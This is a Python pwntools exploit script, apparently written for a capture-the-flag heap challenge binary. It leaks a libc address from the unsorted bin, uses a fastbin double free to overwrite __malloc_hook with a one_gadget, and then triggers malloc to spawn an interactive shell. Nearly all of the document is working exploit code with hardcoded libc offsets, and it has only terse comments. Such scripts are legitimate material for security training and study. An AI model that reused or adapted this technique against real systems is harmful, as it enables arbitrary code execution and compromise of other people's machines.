#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./old_patched")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
libc_offset = 0x3c4b78 # Calculated by leaking unsortedbins with no aslr and calculating distance to libc base
one_offset = 0x4527a
malloc_hook_offset = 0x3c4b10 # found using objdump -T <libc> | grep __malloc_hook
rdi_off = 0x21112
rdx_rsi_off = 0x1151c9
binsh_off = 0x18ce57

# Functions
m_index = 0

def malloc(size: int):
    global m_index
    io.sendline(b"1")
    io.sendlineafter(b"idx: ", f"{m_index}".encode())
    m_index += 1
    io.sendlineafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")

def free(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"> ")

def write(content: bytes, index: int):
    io.sendline(b"3")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.sendlineafter(b"contents: ", content)
    io.recvuntil(b"> ")

def view(index: int):
    io.sendline(b"4")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"data: ")
    leak = io.recvuntil(b"[")
    io.recvuntil(b"> ")
    return leak

io = start()

# 1. leak libc
malloc(0x80) # idx 0
malloc(0x20) # idx 1
free(0) # puts idx 0 into unsortedbind
libc_leak = view(0).rstrip(b"[")
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
log.info("libc leak: %s" % hex(libc_leak))
libc_base = libc_leak - libc_offset
log.info("libc base: %s" % hex(libc_base))

rdi_ret = rdi_off + libc_base
rdx_rsi_ret = rdx_rsi_off + libc_base

one_gadget = libc_base + one_offset
malloc_hook = libc_base + malloc_hook_offset

# 2. fastbin dup

malloc(0x80) # Old chunk, idx 2. Requested from unsortedbin
malloc(0x68) # A idx 3
malloc(0x68) # B idx 4

free(3) # A idx 3 : A linked into fastbin
free(4) # B idx 4 : B linked into fastbin
free(3) # A idx 3 : A linked into fastbin again

malloc(0x68) # 5
write(p64(malloc_hook-35), 5)
malloc(0x68) # 6
malloc(0x68) # 7 Put malloc_hook-35 into fastbin 0x70

malloc(0x68) # 8 Request 0x70 chunk starting from malloc_hook-35

# Padding is 19 because 16 metadata + 19 padding = 35
write(b"A"*19 + p64(one_gadget),8) # Overwrite malloc_hook with one gadget

# Request final chunk manually because our malloc() has recvline(b">") at the end
# and this will wait indefinetely because system(/bin/sh) is called
io.sendline(b"1")
io.sendlineafter(b"idx:", b"9") # idx 9
io.sendlineafter(b"size:", b"0x1") # random size, not important

io.interactive()
